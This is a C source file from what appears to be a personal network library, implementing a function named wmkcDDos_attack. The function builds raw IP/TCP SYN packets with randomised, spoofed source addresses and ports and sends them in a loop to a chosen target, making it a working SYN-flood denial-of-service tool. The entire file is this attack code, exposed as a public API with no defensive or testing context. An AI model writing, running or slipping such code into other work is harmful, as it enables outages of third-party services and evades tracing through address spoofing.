#include <network/wmkc_ddos.h>

#ifdef WMKC_DDOS
WMKC_PRIVATE(wmkcVoid) wmkcDDos_rand_ip
WMKC_OF((wmkcChar *ip_addr_ptr))
{
    wmkcMem_zero(ip_addr_ptr, WMKC_DDOS_IP_ADDR_LEN);

    wmkcByte ip_addr_byte[4] = {
        wmkcRandom_randint(0x00, 0xff),
        wmkcRandom_randint(0x00, 0xff),
        wmkcRandom_randint(0x00, 0xff),
        wmkcRandom_randint(0x00, 0xff)};

    snprintf(ip_addr_ptr, WMKC_DDOS_IP_ADDR_LEN, "%u.%u.%u.%u",
        ip_addr_byte[0], ip_addr_byte[1], ip_addr_byte[2], ip_addr_byte[3]);
}

WMKC_PUBLIC(wmkcErr_obj) wmkcDDos_attack WMKC_OPEN_API
WMKC_OF((wmkcCSTR dstIP, wmkc_u16 dstPort, wmkcCSTR srcIP, wmkc_u16 srcPort, wmkcSize count))
{
    wmkcErr_obj error;
    if(!dstIP || !dstPort) {
        wmkcErr_return(error, wmkcErr_ErrNULL, "wmkcDDos_attack",
            "dstIP or dstPort is NULL.");
    }
    wmkcRandom_seed();
    wmkcNetBufT packet[2048];
    IPHDR  *ip_header  = (IPHDR *)packet;
    TCPHDR *tcp_header = (TCPHDR *)(packet + sizeof(IPHDR));
    SOCKADDR_IN dest_addr;
    SOCKADDR *_dst_p = (SOCKADDR *)&dest_addr;

    // 创建套接字
    wmkc_u32 sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    // 解析域名
    wmkcNet_getaddrinfo(_dst_p, dstIP, AF_INET);
    dest_addr.sin_port        = htons(dstPort);
    dest_addr.sin_family      = AF_INET;

    // 发送SYN数据包
    wmkcBool _random_ip = false;
    wmkcBool _random_port = false;
    if(!srcIP) _random_ip = true;
    if(!srcPort) _random_port = true;
    wmkcChar src_ipv4_addr[WMKC_DDOS_IP_ADDR_LEN];

    for(wmkc_u32 i = 0; i < count; ++i) {
        if(_random_ip) {
            wmkcDDos_rand_ip(src_ipv4_addr);
            srcIP = src_ipv4_addr;
        }
        if(_random_port) {
            srcPort = wmkcRandom_randint(0x0000, 0xffff);
        }

        ip_header->ihl = 5;
        ip_header->version = 4;
        ip_header->tos = 0;
        ip_header->tot_len = sizeof(IPHDR) + sizeof(TCPHDR);
        ip_header->id = htons(54321);
        ip_header->frag_off = 0;
        ip_header->ttl = 255;
        ip_header->protocol = IPPROTO_TCP;
        ip_header->check = 0;
        ip_header->saddr = inet_addr(srcIP);
        ip_header->daddr = dest_addr.sin_addr.s_addr;

        tcp_header->source  = htons(srcPort);
        tcp_header->dest    = dest_addr.sin_port;
        tcp_header->seq     = htonl(i);
        tcp_header->ack_seq = i;
        tcp_header->doff    = 5;
        tcp_header->syn     = 1;
        tcp_header->window  = htons(wmkcRandom_randint(0x0000, 0xffff));
        tcp_header->check   = 0;
        tcp_header->urg_ptr = 0;

        sendto(sockfd, packet, sizeof(IPHDR) + sizeof(TCPHDR), 0,
               (struct sockaddr *)&dest_addr, sizeof(dest_addr));
    }

    // 关闭套接字
    close(sockfd);
    wmkcErr_return(error, wmkcErr_OK, "wmkcDDos_attack", "OK.");
}
#endif /* WMKC_DDOS */
